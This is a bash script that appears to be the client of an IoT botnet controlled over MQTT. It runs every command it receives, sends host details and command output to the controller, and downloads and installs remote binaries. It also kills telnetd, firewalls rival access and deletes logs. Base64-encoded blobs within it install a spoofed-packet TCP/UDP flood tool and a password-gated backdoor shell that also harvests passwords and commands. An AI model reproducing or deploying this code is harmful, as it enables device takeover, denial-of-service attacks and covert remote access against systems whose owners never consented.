# vim: syntax=bash
jsonify(){
jtemp=$(mktemp json.XXXXXX);rm $jtemp
tempf="$workdir/$jtemp"
input="$1"
echo "$2" > $tempf
bbj="$(jshon -Qs 2>/dev/null 1>/dev/null)"
getip=$bbj"$(echo $mq_ip)"
unixtime=$bbj"$(date +%s)"
getdate=$bbj"$(date)"
getuptime=$bbj"$(uptime | sed s/\,//)"
kernelcmdline=$bbj"$(cat /proc/cmdline)"
getid=$bbj"$(id)"
kcrypto=$bbj"$(cat /proc/crypto | grep name | cut -d':' -f2 | uniq | tr -s '\n' ' '|sed s/\,//)"
getversion=$bbj"$(cat /proc/version)"
memstat=$bbj"$(cat /proc/meminfo | head -n 3 | tr -s '\n' ' ')"
getcwd=$bbj"$(pwd)"
defshell=$bbj"$(echo $SHELL)"
currentshell=$bbj"$(which $shell)"
getstty=$bbj"$(stty 2>/dev/null||echo 'n/a')"
term=$bbj"$(echo $TERM)"
cpuname=$bbj"$(cat /proc/cpuinfo | grep name || echo 'n/a')"
status=$bbj"$(if ([ -s /tmp/.status ] && [ -f /tmp/.status ]); then echo "SYSTEM_BUSY" ; else echo "SYSTEM_READY";fi)"
hashcmd=$bbj"$(md5sum $tempf |head -c 32)"
uuid=$bbj"'$unixtime.$hashcmd'"
botversion=$bbj"'$(echo $mq_version)'"
output=$bbj"'$($shell $tempf)'"
cmdline=$bbj"$(echo $(cat $input))"

echo '{
"ip" : "'$getip'",
"unixtime": "'$unixtime'",
"date": "'$getdate'",
"uptime" : "'$getuptime'",
"cpuname": "'$cpuname'",
"memstat" : "'$memstat'",
"id" : "'$getid'",
"version" : "'$getversion'",
"kernel_cmdline": "'$kernelcmdline'",
"kernel_crypto": "'$kcrypto'",
"default shell": "'$defshell'",
"current shell": "'$currentshell'",
"shell level": "'$SHLVL'",
"term": "'$term'",
"stty": "'$getstty'",
"cwd": "'$getcwd'",
"uuid": "'$uuid'",
"status": "'$status'",
"bot version: "'$botversion'",
"cmdline": "'$cmdline'",
"output": "'$output'"
}' 2>>$errorlog
rm -f $jtemp
}


publish(){
mq_debug && echo "[*] Function publish called..."
uxt=$(date +%s)
pubtemp=$(mktemp pub.XXXXXX);rm $pubtemp
jshout=$workdir/jshout.$uxt
jshin=$workdir/$pubtemp
echo "$input" >$jshin
mq_debug && echo '[*] Calling jsonify... (in shell version its called from publish)'
(jsonify "$jshin" "cat $out" | base64) 2>> $errorlog > $jshout
if ([[ "$?" -eq "0" ]] && [[ -s $out ]]); then
  mq_debug && echo "[<<] Publishing output to topic $mq_pubtop on $mq_host"
  pubclient --quiet -h $mq_host -i $mq_ip -q 1 -t "data/$mq_pubtop" -u bot -P $mq_pass -f $jshout 2>>$errorlog
else
  mq_debug && echo '[!] Command failed, will not publish output.'
fi
rm -f $out $jshout $jshin 2>>$errorlog
wait;unset thrdpid _cmd_ out
}

execNoJson(){
mq_debug && echo '[<<] Executing and publishing plaintext output cmd...'
(($shell "$@"|base64)|(pubclient --quiet -h $mq_host -i $mq_ip -q 1 -t "data/$mq_pubtop" -u bot -P $mq_pass -s)) 2>>$errorlog &
}

sendUsage(){
mq_debug && echo '[<<] Sending usage...'
echo -e "\n\nMqSH Version $mq_version\nAny received commands are executed, unless they are prefixed by a command trigger.\nCurrenly defined valid prefixes currently include...\n__update__ [ Downloads and resources the functions of the bot ]\n__killall__ [ kill all threads started by this bot ]\n_clearmem_ [ Clear unnecessary tempory file ]\n_get_ <file> [ Download a file, check the hash, and install to mq_path ] \n_SH_ <cmd> [ Do not jsonify the output of this command. ]\n" |\
base64|(pubclient --quiet -h $mq_host -i $mq_ip -q 1 -t "data/$mq_pubtop" -u bot -P $mq_pass -s) 2>>$errorlog &
}


execute(){
#mq_debug && echo "[*] Function execute called..."
input="$@"
uxt=$(date +%s)
temp=$(mktemp cmd.XXXXXX);rm $temp
piddir=/tmp/.mqsh/pids
_cmd_="${workdir}/${temp}"
mq_debug && echo "[*] Executing $input"
printf 'export thrdpid=$(mktemp XXXXXX);rm $thrdpid \necho "$$" > /tmp/.mqsh/pids/${thrdpid}.pid \n' >$_cmd_
echo "$input" >> $_cmd_
out="$workdir/output.${uxt}"
((($shell $_cmd_ ) & wait) 2>> $errorlog > $out );\
((if [[ -s $out ]] ; then publish $out "$input"; else rm $out;fi &)&)
for i in `ls $piddir`;do if ! ps|grep `cat $piddir/$i`|grep -v 'grep' >>$errorlog 2>&1;then rm $piddir/$i;fi ;done
rm -f $_cmd_
#mq_debug && echo '[<<] I have executed the command...'
} 

maybe(){
if [ $(( $RANDOM % 2)) -eq 0 ]; then
  return 0
else
  return 1
fi
}



repoGet(){
checkhash(){
  bin="$1";fhash="$2"
  if (echo $fhash *$bin | sha1sum -c -) > /dev/null 2>&1 ; then
    return 0
  else 
    return 1
  fi }
getbin="$1"
mq_debug && echo "Getting hash file of $1"
wget -O /tmp/bin.sha1 $mq_httphost/repo/$getbin.sha1
gethash=$(cat /tmp/bin.sha1)
if ! checkhash $mq_binpath/$getbin $gethash;then 
  rm /tmp/bin.out; 
  for i in $(seq 1 5) ;do 
    mq_debug && echo "Downloading $getbin from repository..."
    wget -O /tmp/bin.out $mq_httphost/repo/$getbin; 
    if checkhash /tmp/bin.out $gethash;then  
      mq_debug && echo "Hash matches!"
      break
    else 
      mq_debug && echo "Corrupted file, wait and try again..."
      sleep $(echo $RANDOM|head -c 2)
    fi
  done 
mv /tmp/bin.out $mq_binpath/$getbin
chmod +x $mq_binpath/$getbin
fi
}


clearmem(){
(>$workdir/error.log 
rm -f $workdir/cmd.*
>$cwd/nohup.out
rm -f /var/log/h*
rm -f /tmp/.bd/*) >>$errorlog 2>&1
}

# vim: syntax=bash
ctrl_c(){
echo -en "\n## Caught SIGINT; Clean up and Exit \n"
kill "`cat $subpidfile`"
rm $pipe $enc $denc $workdir/output* $pidfile $subpidfile
unset mq_host mq_pass mq_path mq_debug key mq_intf mq_subtop mq_pubtop mq_httphost mq_ipthost mq_binpath mq_shell
exit
}


quit(){
(rm $pipe $enc $denc $workdir/output*
kill `cat $subpidfile` ; rm $subpidfile
unset mq_host mq_pass mq_path mq_debug key mq_intf mq_subtop mq_pubtop mq_httphost mq_ipthost mq_binpath mq_shell
[ mq_debug == "0" ] && reboot || (rm -f $workdir);exit) >>$errorlog 2>&1
}


killThreads(){
mq_debug && echo '[info] Received killall, killing all threads and messages...'
(for i in $(ls $piddir);do
  echo "Killing $i" >>$errorlog
  kill -15 $(cat $piddir/$i)
done
for i in $(pgrep -f "$shell /tmp/.mqsh/_cmd_" >>$errorlog 2>&1);do 
  kill $i 
done
killall pubclient) >>$errorlog 2>&1
}


doFirst(){
for i in $(pgrep -f 'sh -c' 2>>$errorlog);do
 kill $i >>$errorlog 2>&1
done
for i in $(pgrep -f /var/bin/loop >>$errorlog 2>&1);do 
  kill $i >>$errorlog 2>&1
  done
killall sleep
echo 'nameserver 8.8.8.8' >/tmp/resolv.conf
echo 'nameserver 8.8.4.4' >>/tmp/resolv.conf
>/$workdir/version.${mq_version}
}




spitSomeBin(){
mq_debug && echo 'Writing binary files...'
cat << EOF > /tmp/dos 

IyEvdmFyL2Jpbi9hc2gKIyBBdXRvRG9TIC0gU2hlbGwgV3JhcHBlciB0byBTZW5kIE11bHRpcGxlIFNwb29mZWQgUGFja2V0cwojIFNoZWxselJ1cyAyMDE2CiMKCm1vZGU9JDEKaXA9JDIKcG9ydD0kezM6LSI4MCJ9CnRocmVhZHM9JHs0Oi0iNSJ9CnNlY3M9JHs1Oi0iMzAifQoKc3RhdGZpbGU9L3RtcC8uc3RhdHVzCgoKI1NFUSgpe2k9MDt3aGlsZSBbWyAiJGkiIC1sdCAxMCBdXTtkbyBlY2hvICRpOyBpPWBleHByICRpICsgMWA7ZG9uZX0KdXNhZ2UoKXsKZWNobyAiIFwKLSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0KIEF1dG8tRG9zIFZlcnNpb24gMy4wCiAgVXNhZ2U6CiAgJDAgW3RhcmdldCBpcF1bcG9ydF1bdGhyZWFkc11bc2Vjc10KICBEZWZhdWx0OiA1IHRocmVhZHMvMzAgc2VjIE1heDogMjAgdGhyZWFkcy8zMDAgc2VjCi0jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0iCn0KCmZpbmlzaCgpewogICAgaWYgW1sgLXMgIiRzdGF0ZmlsZSIgXV07dGhlbgogICAgID4kc3RhdGZpbGUKICAgIGZpCn0KCnRjcCgpewojZWNobyAiJHRoaXNib3QgOiIKcG9ydD0kezI6LSI4MCJ9CnRocmVhZHM9JHszOi0iNSJ9CnNlY3M9JHs0Oi0iMzAifQplY2hvICJIaXR0aW5nICRpcDokcG9ydCBGb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB0Y3AiCnNzeW4yICRpcCAkcG9ydCAkdGhyZWFkcyAkc2VjcyA+L2Rldi9udWxsICYgZWNobyAiJCEiID4gJHN0YXRmaWxlCnNsZWVwICRzZWNzICYmIGZpbmlzaAp9CnVkcCgpewpwb3J0PSR7MjotIjgwIn0KdGhyZWFkcz0kezM6LSI1In0Kc2Vjcz0kezQ6LSIzMCJ9CiNlY2hvICIkdGhpc2JvdCA6IgplY2hvICJIaXR0aW5nICRpcDokcG9ydCBmb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB1ZHAiCnN1ZHAgJGlwICRwb3J0IDEgJHRocmVhZHMgJHNlY3MgPi9kZXYvbnVsbCAmIGVjaG8gIiQhIiA+ICRzdGF0ZmlsZQpzbGVlcCAkc2VjcyAmJiBmaW5pc2gKfQoKa2lsbEl0KCl7CmtpbGwgLTkgYGNhdCAkc3RhdGZpbGVgOyhbICIkPyIgLWVxICIwIiBdKSAmJiBlY2hvICJLaWxsZWQiOz4kc3RhdGZpbGUKfQoKY2hlY2soKXsKCmlmIFtbICEgLWYgJHN0YXRmaWxlIF1dO3RoZW4gdG91Y2ggJHN0YXRmaWxlO2ZpCnN0YXQ9YGNhdCAkc3RhdGZpbGVgCiN0aGlzQm90PWAvc2Jpbi9pZmNvbmZpZyBldGgxIHwgZ3JlcCBNYXNrIHwgY3V0IC1kICc6JyAtZjIgfCBjdXQgLWQgIiAiIC1mMWAKaWYgKFtbICIkaXAiID09ICIiIF1dIHx8IFtbICIkcG9ydCIgPT0gIiIgXV0gfHwgW1sgIiR0aHJlYWRzIiAtZ3QgIjIwIiBdXSB8fCBbWyAiJHNlY3MiIC1ndCAiMzAwIiBdXSApCnRoZW4KdXNhZ2UKZXhpdCAxCmVsc2UgCmlmIFsgLXMgJHN0YXRmaWxlIF0gO3RoZW4KZWNobyBTeXN0ZW0gaXMgYnVzeS4gV2FpdCBhIG1pbnV0ZS4KZXhpdCAxCmZpCmZpCn0KCmNhc2UgJG1vZGUgaW4gLXR8LS10Y3ApCgpjaGVjawp0cmFwIGZpbmlzaCAxIDIgOAp0Y3AgJGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwotdXwtLXVkcCkKY2hlY2sKdHJhcCBmaW5pc2ggMSAyIDgKdWRwIGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwoKLWt8LS1raWxsKQpraWxsSXQKOzsKKikKZWNobyAiJDAgW21vZGVbLS10Y3AvLS11ZHBdXSBbaXBdIFtwb3J0XSBbdGhyZWFkXSBbc2Vjc10iCjs7CmVzYWMKCmV4aXQK 

EOF

(cat /tmp/dos | base64 -d > $mq_binpath/dos  ; chmod +x $mq_binpath/dos; rm -f /tmp/dos)2>>$errorlog

cat << EOF > /tmp/bd

IyEvdmFyL2Jpbi9hc2gKIyBIYXNoIGhlcmUgYXQgdG9wIGZvciBlYXN5IHNlZCBwYXNzd2QgY2hhbmdlCmhhc2g9ImE3MDQzMjg0ZDI4NjM5ZjY2YTBjZTRhOWMwZTMyNTk4Yjk4ZjJlOTRkNGMwY2E2NGIwYTdhMWE3NDc4M2YwNTA1YmYwNzI3ZmQ4ODNjOGE4N2U4Y2E2M2M3MmI3YmEyNTc4MDRlZDEwM2U3NjcxNWZhNTI4M2NjYjdlZmE3YWIwIgoKYmFja2Rvb3IoKXsKY2QgL3RtcC8uYmQgIyBXZSBzaG91bGQgYmUgaW4gYSB3cml0YWJsZSBkaXJlY3RvcnkKZXhwb3J0IFBBVEg9L3Vzci9zYmluOi9iaW46L3Vzci9iaW46L3NiaW46L3Zhci9iaW4KICBmb3IgaSBpbiAkKHNlcSAxIDUpO2RvICMgNSBhdHRlbXBzIGJlZm9yZSB1cmFuZG9tIGJsYXN0CiAgICB1bnNldCAkbDAwczNyc2hhbWUgMj4vZGV2L251bGwgCiAgICB1bnNldCAkbWFnaWMgMj4vZGV2L251bGwgIyBhbHdheXMgbWFrZSBzdXJlIHBhc3N3b3JkIGlzIHVuc2V0CiAgICBzZXQgK2EgIyBkb24ndCBleHBvcnQgdmFyaWFibGVzCiAgICByZWFkIC1yIC1wICJVc2VybmFtZSA6ICIgbDAwczNyc2hhbWUgMj4mMSAgIyBnZXQgdXNlcm5hbWUuIGtpbmRhIG1lc3N5CiAgICBpZiBwcmludGYgIiRsMDBzM3JzaGFtZVxuInwgZ3JlcCAtcSAnc2hlbGx6XHxhZG1pblx8dGVjaFx8QWRtaW5cfHVzZXInOyB0aGVuCiAgICAgIElGUz0gcmVhZCAtciAtcyAtcCAiUGFzc3dvcmQgOiAiIG1hZ2ljIDI+JjEgJiYgXAogICAgICBwcmludGYgIiRtYWdpYyIgPi90bXAvLmJkLy5wYXNzO3Vuc2V0IG1hZ2ljIDI+L2Rldi9udWxsICMgd3JpdGUgYW5kIGVyYXNlIGZyb20gbWVtb3J5CiAgICAgIGlmIGVjaG8gIiRoYXNoICovdG1wLy5iZC8ucGFzcyIgfCBzaGE1MTJzdW0gLWMgLSA+IC9kZXYvbnVsbCAyPiYxOyB0aGVuICMgY2hlY2sgaGFzaAogICAgICAgID4vdG1wLy5iZC8ucGFzczsgIyB6ZXJvIHRoZSB0ZW1wb3JhcnkgZmlsZSAobWt0ZW1wIHdvdWxkIGJlIHNtYXJ0IGhlcmUpCiAgICAgICAgcHJpbnRmICJcbkFjY2VzcyBHcmFudGVkIVxuIiAjIHVzZXIgaXMgaW4KICAgICAgICBzZXQgYXV0aHRva2VuPSJ0cnVlIiAjIGRvdWJsZSBtZWFzdXJlIG9mIGF1dGgKICAgICAgICBpZiAkYXV0aHRva2VuO3RoZW4KICAgICAgICAgIGV4cG9ydCBIT01FPS90bXAgIyBzdHVmZiB0byBkbyBiZWZvcmUgdGhlIHNoZWxsCiAgICAgICAgICBleHBvcnQgSElTVEZJTEU9L2Rldi9udWxsCiAgICAgICAgICAvYmluL3NoIC1pIDI+JjEgIyBvdXIgc2hlbGwKICAgICAgICAgIGV4aXQKICAgICAgICBmaQogICAgICAgIHVuc2V0ICRhdXRodG9rZW4gMj4vZGV2L251bGwgIyB1bnNldCBhbGwgb3VyIHN0dWZmIChhZ2FpbikKICAgICAgICB1bnNldCAkbDAwczNyc2hhbWUgMj4vZGV2L251bGwKICAgICAgICB1bnNldCAkbWFnaWMgMj4vZGV2L251bGwgCiAgICAgIGVsaWYgZ3JlcCAtcSAnYWRtaW5cfHJvb3RcfHRvb3JcfHhjMzUxMVx8dml6eHZcfDg4ODg4OFx8c3VwcG9ydFx8dXNlclx8dGVjaCcgL3RtcC8uYmQvLnBhc3MgOyB0aGVuICMgb3IgaWYgaXRzIGEgaG9uZXkgdHJpZ2dlciBwYXNzd29yZCAobGlrZSAnYWRtaW4nIC4uLikKICAgICAgICBwcmludGYgJ1xuQnVzeUJveCB2MS4wMSAoMjAxMy4wOC4xNy0wNTo0NCswMDAwKSBCdWlsdC1pbiBzaGVsbCAobXNoKVxuRW50ZXIgImhlbHAiIGZvciBhIGxpc3Qgb2YgYnVpbHQtaW4gY29tbWFuZHMuXG4nCiAgICAgICAgZm9yIGkgaW4gJChzZXEgMSAxMCk7ZG8gIyBhbGxvdyB0aGVtIHRvIHJ1biB0ZW4gY29tbWFuZHMgCiAgICAgICAgIHJlYWQgLXJwICAiIyIgcGF5bG9hZCAyPiYxID4vZGV2L3N0ZG91dAogICAgICAgICAgZWNobyAiJHBheWxvYWQiID4+L3RtcC8uYmQvcGF5bG9hZHMgIyBTYXZlIHRoZSBjb21tYW5kcwoJICB1bnNldCBwYXlsb2FkCiAgICAgICAgICBhcnJbMF09IlNlZ21lbnRhdGlvbiBmYXVsdC4gQ29yZSBkdW1wZWQuIgogICAJICBhcnJbMV09ImVycm9yOiBub3QgZW5vdWdoIGFyZ3VtZW50cyIKICAJICBhcnJbMl09ImV4ZWM6IGZpbGUgZm9ybWF0IGVycm9yIgogCSAgYXJyWzNdPSJTSUdTRUdWOiBDb3JlIGR1bXBlZC4iCgkgIGFycls0XT0iU2VtZW50YXRpb24gZmF1bHQuIgoJICBhcnJbNV09InNoOiBjb21tYW5kIG5vdCBmb3VuZCIKCSAgYXJyWzZdPSJzaDogbm8gc3VjaCBmaWxlIG9yIGRpcmVjdG9yeSIKCSAgYXJyWzddPSIvbGliL2xkLXVDbGliYy5zby4wOiBObyBzdWNoIGZpbGUgb3IgZGlyZWN0b3J5IgoJICBhcnJbOF09IlVuZXhwZWN0ZWQg4oCYO+KAmSwgZXhwZWN0aW5nIOKAmDvigJkiCgkgIGFycls5XT0iRXJyb3I6IEVycm9yIG9jdXJyZWQgd2hlbiBhdHRlbXB0aW5nIHRvIHByaW50IGVycm9yIG1lc3NhZ2UuIgoJICBhcnJbMTBdPSJVc2VyIEVycm9yOiBBbiB1bmtub3duIGVycm9yIGhhcyBvY2N1cnJlZCBpbiBhbiB1bmlkZW50aWZpZWQgcHJvZ3JhbSAiCgkgIGFyclsxMV09IndoaWxlIGV4ZWN1dGluZyBhbiB1bmltcGxlbWVudGVkIGZ1bmN0aW9uIGF0IGFuIHVuZGVmaW5lZCBhZGRyZXNzLiAiCgkgIGFyclsxMl09IkNvcnJlY3QgZXJyb3IgYW5kIHRyeSBhZ2Fpbi4iCgkgIGFyclsxM109Iktlcm5lbCBwYW5pYyAtIG5vdCBzeW5jaW5nOiAobnVsbCkiCgkgIGFyclsxNF09Ik5vLiIKCSAgYXJyWzE1XT0ic3ludGF4IGVycm9yOiBVbmV4cGVjdGVkOiDigJgv4oCZIEV4cGVjdGVkOiDigJhcXOKAmSIgInNoOiBwZXJtaXNzaW9uIGRlbmllZCIKCSAgYXJyWzE2XT0iRU9GIGVycm9yOiBicm9rZW4gcGlwZS4iICJzaDogT3BlcmF0aW9uIG5vdCBwZXJtaXR0ZWQiCgkgIGFyclsxN109ImVycm9yOiBpbml0OiBJZCBcIjNcIiByZXNwYXduaW5nIHRvbyBmYXN0OiBkaXNhYmxlZCBmb3IgNSBtaW51dGVzOiAiCgkgIGFyclsxOF09ImNvbW1hbmQgZmFpbGVkIgogICAgICAgICAgYXJyWzE5XT0iQ2Fu4oCZdCBjYXN0IGEgdm9pZCB0eXBlIHRvIHR5cGUgdm9pZC4iCgkgIGFyclsyMF09IktleWJvYXJkIG5vdCBwcmVzZW50LCBwcmVzcyBhbnkga2V5IgogICAgICAgICAgYXJyWzIxXT0iVXNlciBFcnJvcjogQW4gdW5rbm93biBlcnJvciBoYXMgb2NjdXJyZWQgaW4gYW4gdW5pZGVudGlmaWVkIHByb2dyYW0gd2hpbGUgZXhlY3V0aW5nIGFuIHVuaW1wbGVtZW50ZWQgZnVuY3Rpb24gYXQgYW4gdW5kZWZpbmVkIGFkZHJlc3MuIENvcnJlY3QgZXJyb3IgYW5kIHRyeSBhZ2Fpbi4iCiAgICAgICAgICBhcnJbMjJdPSJGQVRBTCEgRGF0YSBjb3JydXB0IGF0IGFuIHVua25vd24gbWVtb3J5IGFkZHJlc3MsIG5vdGhpbmcgdG8gYmUgZG9uZSBhYm91dCBpdC4iCiAgICAgICAgICBhcnJbMjNdPSI/Pz8gLS0gU29tZXRoaW5nIGhvcnJpYmxlIGp1c3QgaGFwcGVuZWQsIHBsZWFzZSBlbnN1cmUgYWxsIGNhYmxlcyBhcmUgc2VjdXJlbHkgY29ubmVjdGVkISIKCSAgcmFuZD0kWyAkUkFORE9NICUgMjQgXQoJICBlY2hvICR7YXJyWyRyYW5kXX0gICAgIAogICAgICAgIGRvbmUKICAgICAgICBoZWFkIC1uIDUwMCAvZGV2L3VyYW5kb20gMj4vZGV2L251bGwgMDwvZGV2L251bGwKICAgICAgICBleGl0CiAgICAgIGVsc2UgIyBvdGhlcndpc2UganVzdCBzYXkgdW5hdXRob3JpemVkLi4uIAogICAgICAgIHByaW50ZiAiVW5hdXRob3JpemVkIVxuIgogICAgICAgIGNhdCAvdG1wLy5iZC8ucGFzcyA+Pi90bXAvLmJkL3Bhc3N3b3JkcyAjIC4uLiBidXQgc3RvcmUgdGhlIHBhc3N3b3JkCiAgICAgICAgc2xlZXAgMSAgICAgIAogIGZpCmVsc2UKICBwcmludGYgIlVuYXV0aG9yaXplZCFcbiIgMj4vZGV2L251bGwgIyBlbmQgaWYgZm9yIHVzZXJuYW1lCiAgc2xlZXAgMSAyPi9kZXYvbnVsbApmaQpkb25lICMgVGhyZWUgYmFkIGF1dGhzLCBzbyB1cmFuZG9tIGJsYXN0IQoKcHJpbnRmICJUb28gbWFueSBhdXRoZW50aWNhdGlvbiBmYWlsdXJlcy5cbiBXYWl0IGZvciBpdC4uLlxuIiAyPi9kZXYvbnVsbApzbGVlcCAxCmhlYWQgLW4gNTAwIC9kZXYvdXJhbmRvbSAyPi9kZXYvbnVsbCAwPC9kZXYvbnVsbApleGl0Cn0KIyBjcmVhdGUgc3R1ZmYgd2UgbmVlZAppZiBbICEgLWQgL3RtcC8uYmQgXTt0aGVuIG1rZGlyIC90bXAvLmJkIDtmaSA7IGNobW9kIDcwMCAvdG1wLy5iZAppZiBbICEgLWYgL3RtcC8uYmQvcGFzc3dvcmRzIF07dGhlbiA+L3RtcC8uYmQvcGFzc3dvcmRzO2ZpIDsgY2htb2QgNjAwIC90bXAvLmJkL3Bhc3N3b3JkcwppZiBbICEgLWYgL3RtcC8uYmQvcGF5bG9hZHMgXTt0aGVuID4vdG1wLy5iZC9wYXlsb2FkcztmaQpiYWNrZG9vciAyPi9kZXYvbnVsbApleGl0Cgo=

EOF

(cat /tmp/bd | base64 -d > $mq_binpath/bd  ; chmod +x $mq_binpath/bd; rm -f /tmp/bd)2>>$errorlog

} 

sendClientHello(){
mq_debug && echo "[*] Sending client hello message..."
helloTmp="$workdir/hello"
(printf "Client $mq_ip Hello: $(uptime)") 2>>$errorlog >$helloTmp
if ([ "$?" -eq "0" ] && [ -s $hello ]); then
  pubclient --quiet -h $mq_host -i $mq_ip -q 1 -t data/alive -u bot -P $mq_pass -f $helloTmp 2>>$errorlog &
else
  echo 'Error sending hello message!' >>$errorlog 2>&1
fi
rm -f $hello
}

customFunc(){
case "$@" in
killtn)

for i in $(seq 1 3); do
  if pidof subclient >>$errorlog ; then 
    killall -9 telnetd >>$errorlog 2>&1 &
    #(telnetd -l $mq_binpath/bd) 
    if [ "$?" -eq "0" ] ; then
      break
    fi
  else
    sleep 3
  fi
done

;;

getBackdoor)
if [ ! -f $mq_binpath/bd ]; then 
  wget -O $mq_binpath/bd $mq_httphost/bd
fi
chmod +x $mq_binpath/bd
;;

lockDown)
if ! mq_debug ; then
(iptables-save >$workdir/ipt.orig
/sbin/iptables -N ACCESS
/sbin/iptables -I ACCESS 1 -p tcp --dport 23 -j DROP
/sbin/iptables -I ACCESS 2 -p tcp --dport 80 -j DROP
/sbin/iptables -I INPUT 1 -j ACCESS
/sbin/iptables -A OUTPUT -d 104.31.0.0/16 -j DROP
/sbin/iptables -A OUTPUT -p tcp --dport 23 -j REJECT
iptables-save >$workdir/ipt) >>/dev/null 2>&1
fi
;;

esac
}

subscribe(){
mq_debug && echo "[*} Subscribing to shell/$mq_subtop and shell/$ip"
(subclient --quiet -h $mq_host -q 1 -i $mq_ip -t shell/$mq_ip -t shell/$mq_subtop -u bot -P $mq_pass --will-payload "Client $mq_ip Disconnect" --will-topic data/dead  > $pipe) 2>>$errorlog & echo "$!" > $subpidfile
}

run(){
mq_debug && echo "[*] Starting main loop..."
cd $workdir
denc=$workdir/denc
mq_debug && (echo -n Host: "$mq_host" ;echo Pass :"$mq_pass" ;echo Debug: "mq_debug" ;echo Path:"$mq_path")

if [[ ! -p $pipe ]]; then mkfifo $pipe ;fi
#>$pipe
subscribe
customFunc killtn &
mq_debug || customFunc lockDown &
sendClientHello &
while read "line"; do
mq_debug &&  echo '[>>] Got a command!'
echo "$line" | base64 -d 2>>$errorlog >$denc
mq_debug && echo "[$] Command is \" $(cat $denc) \""

if [[ -s $denc ]] ; then

case "$(cat $denc)" in
__quit__)
if mq_debug ; then
  echo '[!] Received quit, bailing...'
fi
;;
__update__)
if mq_debug ; then
  echo '[!] Received update, getting new config...'
fi
wget -O $mq_binpath/mq $mq_httphost/mq >>$errorlog 2>&1
kill "$(cat $subpidfile)" >>$errorlog 2>&1
break
;;
__killall__)
if mq_debug ; then
  echo '[*] Received a killall, killing threads...'
fi
killThreads >>$errorlog 2>&1  &
  
;;
_clearmem_)
if mq_debug ; then 
  echo '[*] Received clearenv, deleting the logs...'
fi
clearmem >>$errorlog 2>&1 &
;;

_get_*)
if mq_debug ; then 
  echo "[*] Received a get, downloading and installing file..."
fi
getcmd=$(echo -n `cat $denc` | sed s'/_get_ //')
mq_debug && echo [*] Getting ${getcmd}
repoGet "${getcmd}" 2>&1 >>$errorlog &
;;

_SH_*)
shcmd="$(mktemp cmd.XXXXXX)";rm $shcmd
if mq_debug ; then 
  echo "[*] Received an _SH_ command, will exec..."
fi
cat denc|sed s'/_SH_//' >$shcmd
execNoJson $shcmd &
;;

__HELP__)
mq_debug && echo '[>>] Received a HELP command...'
sendUsage &
;;

*)
if mq_debug ; then 
  echo "[*] Received a command, will call execute..."
fi
execute "$(cat $denc)" 2>>$errorlog
if ([[ "$?" -eq "0" ]] && [[ mq_debug ]]); then  
echo '[*] Executed the command in a new thread...'
fi

;;
esac

fi
>$denc
mq_debug && echo "[*] All done with that command..."
done <$pipe
}
